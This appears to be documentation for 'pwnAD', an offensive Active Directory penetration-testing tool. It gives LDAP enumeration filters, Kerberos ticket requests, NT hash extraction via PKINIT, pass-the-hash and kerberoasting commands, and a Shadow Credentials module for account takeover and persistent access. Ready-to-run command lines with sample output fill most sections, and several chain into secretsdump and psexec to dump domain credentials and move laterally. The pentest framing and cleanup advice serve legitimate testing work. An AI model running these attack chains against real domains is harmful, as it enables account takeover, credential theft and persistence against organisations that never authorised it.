pwnAD [auth] query "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" "sAMAccountName"

# Find GPOs
pwnAD [auth] query "(objectClass=groupPolicyContainer)" "displayName,gPCFileSysPath"

docs.title: Time-Based Queries
docs.text:
LDAP timestamps are in Windows FILETIME format:

# Users who haven't logged in recently (requires timestamp calculation)
pwnAD [auth] query "(&(objectClass=user)(lastLogon<=132500000000000000))" "sAMAccountName,lastLogon"

# Recently created objects
pwnAD [auth] query "(whenCreated>=20240101000000.0Z)" "sAMAccountName,whenCreated"

docs.title: Interactive Mode
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!'

# Custom enumeration
pwnAD [domain.local\admin]> query "(objectClass=user)" "sAMAccountName,description"
pwnAD [domain.local\admin]> query "(&(objectClass=group)(cn=*admin*))" "cn,member"

docs.title: User Filters
docs.text: Purpose Filter All users (objectClass=user) Enabled users (&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) Users with SPN (&(objectClass=user)(servicePrincipalName=*)) Users with adminCount (&(objectClass=user)(adminCount=1))

docs.title: Computer Filters
docs.text: Purpose Filter All computers (objectClass=computer) Domain controllers (&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)) Servers (&(objectClass=computer)(operatingSystem=*Server*))

docs.title: Group Filters
docs.text: Purpose Filter All groups (objectClass=group) Security groups (&(objectClass=group)(groupType:1.2.840.113556.1.4.803:=2147483648)) Groups with specific member (&(objectClass=group)(member=CN=User,CN=Users,DC=domain,DC=local))

docs.title: Tips
docs.text:
• Use * for attributes to get all available attributes (useful for discovery)
  • Escape special characters: *, (, ), \, NUL with \xx hex notation
  • Test complex filters incrementally
  • Use debug mode (--debug) to see the actual LDAP query being sent

docs.title: remove Command
docs.text: Remove objects or permissions from Active Directory.

docs.title: Usage
docs.text: pwnAD [auth options] remove <subcommand> [arguments]

docs.title: Subcommands
docs.text: Subcommand Description user Remove a user account computer Remove a computer account groupMember Remove a user/computer from a group dcsync Remove DCSync rights from an object genericAll Remove GenericAll rights from an object RBCD Remove RBCD configuration

docs.title: user
docs.text:
Remove a user account from the domain.

pwnAD [auth] remove user <username>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove user olduser

docs.title: computer
docs.text:
Remove a computer account from the domain.

pwnAD [auth] remove computer <computername>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove computer YOURPC$

docs.title: groupMember
docs.text:
Remove a user or computer from a group.

pwnAD [auth] remove groupMember <group> <member>

Example: 

# Remove user from Domain Admins
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove groupMember "Domain Admins" compromiseduser

docs.title: dcsync
docs.text:
Remove DCSync replication rights from an account.

pwnAD [auth] remove dcsync <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove dcsync attacker

docs.title: genericAll
docs.text:
Remove GenericAll (Full Control) permissions from an object.

pwnAD [auth] remove genericAll <target> <trustee>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove genericAll victim attacker

docs.title: RBCD
docs.text:
Remove Resource-Based Constrained Delegation configuration by clearing the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

pwnAD [auth] remove RBCD <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' remove RBCD TARGETPC$

docs.title: Post-Engagement Cleanup
docs.text:
After a penetration test, clean up any artifacts:

# Start interactive session
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!'

# Remove added accounts
pwnAD [domain.local\admin]> remove user testuser
pwnAD [domain.local\admin]> remove computer YOURPC$

# Remove DCSync rights
pwnAD [domain.local\admin]> remove dcsync compromiseduser

# Remove RBCD configuration
pwnAD [domain.local\admin]> remove RBCD TARGETPC$

# Remove group memberships
pwnAD [domain.local\admin]> remove groupMember "Domain Admins" compromiseduser

Best Practice

Always document and clean up any changes made during testing. Use the shadow module with auto mode for automatic cleanup of key credentials.

docs.title: Kerberos Overview
docs.text: pwnAD includes Kerberos operations for obtaining tickets and extracting credentials. These actions work independently of LDAP.

docs.title: Available Actions
docs.text: Action Description getTGT Obtain a Ticket Granting Ticket getST Obtain a Service Ticket getNThash Retrieve NT hash via PKINIT

docs.title: Authentication Methods
docs.text:
Kerberos actions support multiple authentication methods:

Method Flags Availability Password -p All actions NT Hash -H All actions AES Key --aes-key All actions ccache -k getST only Certificate (PKINIT) -pfx or -cert -key All actions

docs.title: Ticket Granting Ticket (TGT)
docs.text:
A TGT proves you've authenticated to the domain. It's used to request Service Tickets.

Client → KDC: AS-REQ (authentication request)
KDC → Client: AS-REP (TGT)

docs.title: Service Ticket (ST)
docs.text:
A Service Ticket grants access to a specific service (e.g., CIFS, HTTP, LDAP).

Client → KDC: TGS-REQ (with TGT, requesting service)
KDC → Client: TGS-REP (Service Ticket)

docs.title: PKINIT
docs.text:
PKINIT (Public Key Cryptography for Initial Authentication) uses X.509 certificates instead of passwords for Kerberos authentication. This enables:

  • Certificate-based TGT requests
  • NT hash extraction via PAC_CREDENTIAL_INFO

docs.title: Credential Cache (ccache)
docs.text:
Tickets are stored in credential cache files (.ccache). Set the KRB5CCNAME environment variable to use them:

export KRB5CCNAME=/tmp/administrator.ccache

docs.title: Connection Options
docs.text: Option Description --dc-ip IP address of the KDC (usually the DC) --kdcHost FQDN of the KDC -d, --domain Domain FQDN (REALM) -u, --user Username (without domain)

docs.title: Standard Authentication Flow
docs.text:
# Get TGT
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' getTGT
[*] Saving ticket in admin.ccache

# Use TGT to get Service Ticket
export KRB5CCNAME=admin.ccache
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -k getST -spn cifs/dc01.domain.local
[*] Saving ticket in admin@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

docs.title: Certificate-Based Flow (PKINIT)
docs.text:
# Get TGT with certificate
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getTGT
[*] Saving ticket in admin.ccache

# Extract NT hash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getNThash
[*] Got NThash for admin: 31d6cfe0d16ae931b73c59d7e0c089c0

docs.title: Pass-the-Ticket
docs.text:
Use an existing TGT/ST for authentication:

export KRB5CCNAME=/tmp/admin.ccache
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local

docs.title: Kerberoasting Preparation
docs.text:
Get a TGT first, then request service tickets for cracking:

pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' getTGT
export KRB5CCNAME=lowpriv.ccache
GetUserSPNs.py -k -no-pass -dc-ip 192.168.1.10 domain.local/lowpriv

docs.title: Certificate Abuse (ESC1, etc.)
docs.text:
After obtaining a certificate through ADCS abuse:

# Use certificate to get TGT
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getTGT

# Or directly get NT hash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -pfx admin.pfx getNThash

docs.title: getNThash
docs.text: Retrieve the NT hash for an account using PKINIT.

docs.title: Usage
docs.text: pwnAD [auth options] getNThash

docs.title: Description
docs.text: The getNThash action uses PKINIT (certificate-based Kerberos authentication) to obtain a TGT and then extracts the NT hash from the PAC_CREDENTIAL_INFO structure. This is useful when you have a certificate for an account but need the NT hash for other attacks.

docs.title: Requirements
docs.text:
• Valid certificate for the target user
  • Domain supports PKINIT
  • Windows Server 2016+ domain functional level

docs.title: Authentication Methods
docs.text:
Method Flags Description Certificate (PFX) -pfx PKCS#12 file containing cert and key Certificate (PEM) -cert -key Separate certificate and key files

Note

This action requires certificate authentication. Password/hash authentication will not return the NT hash through this method.

docs.title: Using PFX File
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getNThash
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for administrator
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0

docs.title: Using PFX with Password
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx -pfx-pass 'PfxPassword!' getNThash
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0

docs.title: Using Separate Cert and Key
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -cert admin.crt -key admin.key getNThash
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0

docs.title: Interactive Mode
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx

pwnAD [u:DOMAIN\administrator]> getNThash
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for administrator
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0

docs.title: Using the NT Hash
docs.text: Once you have the NT hash, use it for:

docs.title: Pass-the-Hash
docs.text:
# pwnAD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' get users

# Impacket
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@192.168.1.10
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@192.168.1.10

docs.title: Overpass-the-Hash
docs.text: pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' getTGT

docs.title: Output
docs.text:
In addition to displaying the NT hash, this action also:

  • Saves the TGT to <username>.ccache

docs.title: PAC_CREDENTIAL_INFO
docs.text:
When using PKINIT:

  1. Client authenticates using certificate (AS-REQ with PA-PK-AS-REQ)
  2. KDC includes PAC_CREDENTIAL_INFO in the AS-REP
  3. PAC_CREDENTIAL_INFO contains NTLM credentials encrypted with the session key
  4. Client decrypts to obtain NT hash

This only works with PKINIT because the KDC includes the credential info to support NTLM fallback for the authenticated user.

docs.title: Scenario 1: ADCS Certificate Theft
docs.text:
After compromising a certificate through ADCS attacks (ESC1-8):

# Certificate obtained via Certipy or similar
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx stolen_cert.pfx getNThash
[*] Got NThash for administrator: aabbccdd...

# Use hash for DCSync
secretsdump.py -hashes :aabbccdd... domain.local/administrator@192.168.1.10 -just-dc-ntlm

docs.title: Scenario 2: Shadow Credentials Follow-up
docs.text:
After using the shadow auto command, you already have the hash. But if you kept the certificate:

# If you have the certificate from shadow add
pwnAD --dc-ip 192.168.1.10 -d domain.local -u targetuser -pfx targetuser.pfx getNThash

docs.title: Scenario 3: Smartcard User Compromise
docs.text:
If you compromise a user's smartcard certificate:

pwnAD --dc-ip 192.168.1.10 -d domain.local -u smartcard_user -pfx exported_cert.pfx getNThash

docs.title: "KDC_ERR_PADATA_TYPE_NOSUPP"
docs.text:
The KDC doesn't support PKINIT. This typically means:

  • No Certificate Authority is deployed
  • PKINIT is disabled
  • Domain functional level is too low

docs.title: "Certificate validation failed"
docs.text:
The certificate is:

  • Expired
  • Revoked
  • Not trusted by the DC
  • Wrong certificate for the user

docs.title: "No NT hash in PAC_CREDENTIAL_INFO"
docs.text:
The KDC didn't include credentials in the response. This can happen if:

  • The account doesn't have NTLM credentials stored
  • Protected Users group membership

docs.title: References
docs.text:
• PKINITtools by Dirk-jan
  • MS-KILE: PAC_CREDENTIAL_INFO

docs.title: getST
docs.text: Obtain a Kerberos Service Ticket (ST).

docs.title: Usage
docs.text: pwnAD [auth options] getST -spn <service/host>

docs.title: Description
docs.text: The getST action performs a Kerberos TGS-REQ to obtain a Service Ticket for a specified service. This can be done with fresh credentials or using an existing TGT from a ccache file.

docs.title: Parameters
docs.text: Parameter Description -spn Service Principal Name (e.g., cifs/dc01.domain.local)

docs.title: Authentication Methods
docs.text: Method Flags Description Password -p Gets TGT first, then ST NT Hash -H Gets TGT first (Overpass-the-Hash) AES Key --aes-key Gets TGT first (Pass-the-Key) ccache -k Uses existing TGT from KRB5CCNAME Certificate -pfx or -cert -key Gets TGT via PKINIT, then ST

docs.title: Using Password
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!' getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

docs.title: Using Existing TGT
docs.text:
# First, ensure you have a TGT
export KRB5CCNAME=administrator.ccache

# Request Service Ticket
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -k getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

docs.title: Using Certificate (PKINIT)
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

docs.title: Common SPNs
docs.text: Service SPN Format Use Case SMB/CIFS cifs/<hostname> File shares, psexec HTTP http/<hostname> Web services LDAP ldap/<hostname> LDAP operations HOST host/<hostname> General computer access MSSQL MSSQLSvc/<hostname>:1433 SQL Server Exchange exchangeMDB/<hostname> Exchange services

docs.title: Using the Service Ticket
docs.text:
export KRB5CCNAME=administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

# Use with Impacket
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

docs.title: Interactive Mode
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!'

pwnAD [domain.local\administrator]> getST -spn cifs/dc01.domain.local
[*] Getting ST for user
[*] Saving ticket in administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache

# Use immediately
pwnAD [domain.local\administrator]> !export KRB5CCNAME=administrator@cifs_dc01.domain.local@DOMAIN.LOCAL.ccache
pwnAD [domain.local\administrator]> !smbclient.py -k -no-pass domain.local/administrator@dc01

docs.title: Output
docs.text: The Service Ticket is saved as <user>@<spn>@<REALM>.ccache in the current directory.

docs.title: TGS-REQ/TGS-REP
docs.text:
1. Client sends TGS-REQ with:
    • TGT (in PA-TGS-REQ)
    • Requested service (sname)
    • Authenticator (encrypted with TGT session key)
  2. KDC responds with TGS-REP containing:
    • Service Ticket (encrypted with service key)
    • Session key (encrypted with TGT session key)

docs.title: Access Remote Services
docs.text:
# Get ticket for file share
pwnAD [auth] getST -spn cifs/fileserver.domain.local

# Get ticket for web service
pwnAD [auth] getST -spn http/webapp.domain.local

# Get ticket for SQL Server
pwnAD [auth] getST -spn MSSQLSvc/sqlserver.domain.local:1433

docs.title: Kerberoasting
docs.text:
While pwnAD has get kerberoastables for enumeration, you can manually request tickets:

# Request ticket for service account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' getST -spn http/webapp.domain.local

# The ticket can be extracted and cracked offline

docs.title: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
docs.text:
Service not found. Check:

  • SPN spelling and format
  • Service exists (use get spn to enumerate)

docs.title: "KDC_ERR_TGT_REVOKED"
docs.text: TGT has been revoked (password changed). Get a new TGT.

docs.title: "KRB_AP_ERR_MODIFIED"
docs.text:
PAC validation failed. This can indicate:

  • Ticket tampering
  • Clock skew issues
  • Service account password change

docs.title: getTGT
docs.text: Obtain a Kerberos Ticket Granting Ticket (TGT).

docs.title: Usage
docs.text: pwnAD [auth options] getTGT

docs.title: Description
docs.text: The getTGT action performs a Kerberos AS-REQ to obtain a TGT for the authenticated user. The TGT is saved to a .ccache file that can be used for further Kerberos operations.

docs.title: Authentication Methods
docs.text: Method Flags Description Password -p Standard Kerberos authentication NT Hash -H Overpass-the-Hash / Pass-the-Key AES Key --aes-key Pass-the-Key with AES Certificate -pfx or -cert -key PKINIT authentication

docs.title: Password Authentication
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Password123!' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

docs.title: Pass-the-Hash (Overpass-the-Hash)
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

docs.title: AES Key
docs.text:
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator --aes-key '4a3e8a5c...' getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

docs.title: Certificate (PKINIT)
docs.text:
# PFX file
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

# PFX with password
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx -pfx-pass 'PfxPass!' getTGT

# Separate cert and key
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -cert admin.crt -key admin.key getTGT

docs.title: Using the TGT
docs.text:
After obtaining a TGT, set KRB5CCNAME to use it:

export KRB5CCNAME=administrator.ccache

# Use with pwnAD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -k get users

# Use with Impacket tools
secretsdump.py -k -no-pass domain.local/administrator@dc01.domain.local
smbclient.py -k -no-pass domain.local/administrator@dc01.domain.local

docs.title: Interactive Mode
docs.text:
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -p 'Pass!'

pwnAD [domain.local\administrator]> getTGT
[*] Trying to get TGT...
[*] Saving ticket in administrator.ccache

# Set environment variable from within pwnAD
pwnAD [domain.local\administrator]> !export KRB5CCNAME=administrator.ccache

docs.title: Output
docs.text: The TGT is saved as <username>.ccache in the current directory.

docs.title: AS-REQ/AS-REP
docs.text:
1. Client sends AS-REQ with:
    • Username (cname)
    • Realm (domain)
    • Pre-authentication data (encrypted timestamp or PKINIT)
  2. KDC responds with AS-REP containing:
    • TGT (encrypted with krbtgt key)
    • Session key (encrypted with user's key or certificate)

docs.title: PKINIT Flow
docs.text:
When using certificate authentication:

  1. Client sends AS-REQ with PA-PK-AS-REQ containing:
    • Signed authentication data
    • Client certificate
  2. KDC validates certificate and responds with PA-PK-AS-REP
  3. Session key is derived from Diffie-Hellman exchange

docs.title: "KDC_ERR_PREAUTH_FAILED"
docs.text:
Pre-authentication failed. Check:

  • Password/hash is correct
  • Username is correct (case-sensitive)
  • Domain is correct

docs.title: "KDC_ERR_C_PRINCIPAL_UNKNOWN"
docs.text:
User not found in the domain. Verify:

  • Username spelling
  • User exists in the domain

docs.title: "KDC_ERR_CLIENT_REVOKED"
docs.text: Account is disabled or locked. Check account status.

docs.title: "KRB_AP_ERR_SKEW"
docs.text:
Time difference between client and KDC is too large. Sync your clock:

sudo ntpdate <dc-ip>

docs.title: Modules Overview
docs.text: pwnAD includes special attack modules that go beyond basic LDAP operations. These modules implement complex attack chains.

docs.title: Available Modules
docs.text: Module Description shadow Shadow Credentials attack for account takeover

docs.title: What are Modules?
docs.text:
Modules are specialized attack implementations that combine multiple operations:

  • Multi-step attacks - Automated attack chains
  • Cleanup capabilities - Restore original state after exploitation
  • Certificate operations - Generate and use X.509 certificates
  • PKINIT integration - Leverage Kerberos certificate authentication

docs.title: Future Modules
docs.text:
Additional modules are planned for future releases. Potential additions include:

  • ADCS (Active Directory Certificate Services) attacks
  • DACL abuse automation
  • Trust relationship exploitation
  • LAPS (Local Administrator Password Solution) retrieval

docs.title: Shadow Credentials
docs.text: The shadow module implements the Shadow Credentials attack, based on Certipy. This attack abuses the msDS-KeyCredentialLink attribute to take over accounts.

docs.title: Overview
docs.text:
Shadow Credentials allow an attacker to:

  1. Add a Key Credential to a target account's msDS-KeyCredentialLink attribute
  2. Authenticate as that account using PKINIT with the generated certificate
  3. Retrieve the account's NT hash
  4. Optionally restore the original state

docs.title: Requirements
docs.text:
• Permissions: Write access to the target's msDS-KeyCredentialLink attribute
  • Domain: AD DS running on Windows Server 2016+ with domain functional level 2016+
  • Infrastructure: Certificate-based authentication must be available (typically via ADCS)

docs.title: Usage
docs.text: pwnAD [auth options] shadow <subcommand> [arguments]

docs.title: Subcommands
docs.text: Subcommand Description auto Full attack chain with automatic cleanup add Add a Key Credential to target list List Key Credentials on target clear Clear all Key Credentials from target remove Remove specific Key Credential by Device ID info Display Key Credential info for Device ID

docs.title: auto
docs.text:
Execute the complete Shadow Credentials attack with automatic cleanup:

  1. Save current msDS-KeyCredentialLink value
  2. Add new Key Credential with generated certificate
  3. Use PKINIT to authenticate as target
  4. Retrieve NT hash via PAC_CREDENTIAL_INFO
  5. Restore original msDS-KeyCredentialLink value
pwnAD [auth] shadow auto <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow auto targetuser
[*] Targeting user targetuser
[*] Generating certificate
[*] Adding Key Credential with Device ID: abc12345-...
[*] Authenticating with certificate
[*] Got TGT for targetuser
[*] Retrieving NT hash
[*] Got NThash for targetuser: 31d6cfe0d16ae931b73c59d7e0c089c0
[*] Restoring original msDS-KeyCredentialLink
[*] Cleanup complete

docs.title: add
docs.text:
Add a Key Credential to the target account. Outputs a PFX file for later use.

pwnAD [auth] shadow add <target> [-o output.pfx]

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow add targetuser
[*] Targeting user targetuser
[*] Generating certificate
[*] Adding Key Credential with Device ID: abc12345-...
[*] Saved PFX to targetuser.pfx
[*] Device ID: abc12345-...

docs.title: list
docs.text:
List all Key Credentials associated with an account.

pwnAD [auth] shadow list <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow list targetuser
[*] Targeting user targetuser
[*] Listing Key Credentials for targetuser
[*] DeviceID: abc12345-... | Creation Time (UTC): 2025-02-03 11:13:41
[*] DeviceID: def67890-... | Creation Time (UTC): 2025-01-15 09:30:22

docs.title: clear
docs.text:
Remove all Key Credentials from an account.

pwnAD [auth] shadow clear <target>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow clear targetuser
[*] Targeting user targetuser
[*] Clearing all Key Credentials
[*] Successfully cleared msDS-KeyCredentialLink

Warning

This removes all Key Credentials, including legitimate Windows Hello for Business keys.

docs.title: remove
docs.text:
Remove a specific Key Credential by Device ID.

pwnAD [auth] shadow remove <target> <device_id>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow remove targetuser abc12345-...
[*] Targeting user targetuser
[*] Removing Key Credential with Device ID: abc12345-...
[*] Successfully removed Key Credential

docs.title: info
docs.text:
Display detailed information about a Key Credential.

pwnAD [auth] shadow info <target> <device_id>

Example: 

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow info targetuser abc12345-...
[*] Targeting user targetuser
[*] Device ID: abc12345-...
[*] Creation Time: 2025-02-03 11:13:41
[*] Key Usage: NGC
[*] Key Source: AD

docs.title: Scenario 1: Account Takeover with Cleanup
docs.text:
The safest approach using auto:

pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u compromised_admin -p 'Pass!'

pwnAD [domain.local\compromised_admin]> shadow auto highvalue_target
[*] Got NThash for highvalue_target: aabbccdd...

# Use the hash for further access
pwnAD [domain.local\compromised_admin]> !secretsdump.py -hashes :aabbccdd... domain.local/highvalue_target@192.168.1.10

docs.title: Scenario 2: Persistent Access
docs.text:
Add a Key Credential for persistent access:

# Add Key Credential
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow add targetuser

# Later, authenticate with the certificate
pwnAD --dc-ip 192.168.1.10 -d domain.local -pfx targetuser.pfx getTGT

docs.title: Scenario 3: Computer Account Takeover
docs.text:
Shadow Credentials work on computer accounts too:

pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' shadow auto DC01$
[*] Got NThash for DC01$: ...

docs.title: Cleanup
docs.text:
Always clean up after testing:

# List credentials first
pwnAD shadow list targetuser

# Remove specific credential
pwnAD shadow remove targetuser <device_id>

# Or clear all (careful!)
pwnAD shadow clear targetuser

docs.title: "No Key Credentials found"
docs.text: The target has no msDS-KeyCredentialLink entries. This is normal for accounts that haven't used Windows Hello for Business.

docs.title: "Access denied"
docs.text:
You don't have write permission to the target's msDS-KeyCredentialLink attribute. Check your permissions:

  • GenericAll on the target
  • GenericWrite on the target
  • WriteProperty on msDS-KeyCredentialLink

docs.title: "Certificate authentication failed"
docs.text:
The domain may not support PKINIT. Ensure:

  • Windows Server 2016+ domain functional level
  • Certificate-based authentication is enabled
  • ADCS is deployed (or Azure AD joined scenarios)

docs.title: References
docs.text:
• Shadow Credentials - Elad Shamir
  • Certipy
  • MS-KILE - PAC_CREDENTIAL_INFO
